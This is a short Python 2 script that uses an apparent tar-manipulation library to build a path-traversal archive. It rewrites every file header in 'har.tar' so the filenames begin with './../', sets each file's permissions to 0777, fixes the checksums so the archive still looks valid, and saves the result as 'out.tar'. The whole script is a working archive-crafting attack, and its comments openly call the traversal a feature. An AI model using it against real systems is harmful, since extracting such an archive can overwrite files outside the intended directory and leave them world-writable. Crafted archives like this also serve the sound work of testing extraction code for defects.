#!/usr/bin/env python
from har import *

def traverse(filesectors):
	sector = filesectors[0] #grab 1st sector which is the file header
	sector._filename = Tarsector.str2tar("./../" + "".join(filter(lambda x: x, sector._filename)), 100) #the hard way, on raw tar fields
	sector.calculate_checksum()

with open("har.tar", "r") as f: tarf = f.read()
tarball = Tarball(tarf)
map(traverse, tarball) # add nice path traversal

#lets print all new filenames
for file in tarball:
	header = file[0] #header is first sector of file sector list
	print file[0].filename()

for file in tarball:
	header = file[0] #header is first sector of file sector list
	header.filemode(0777) # lets give everyone access
	# header.calculate_checksum() #This fixed the checksum of this header

tarball.calculate_checksums() # this fixes all checksums in tarball (you need this one of the line above, if you want correct checksums)

with open("out.tar", "w") as f: f.write(tarball.dumps())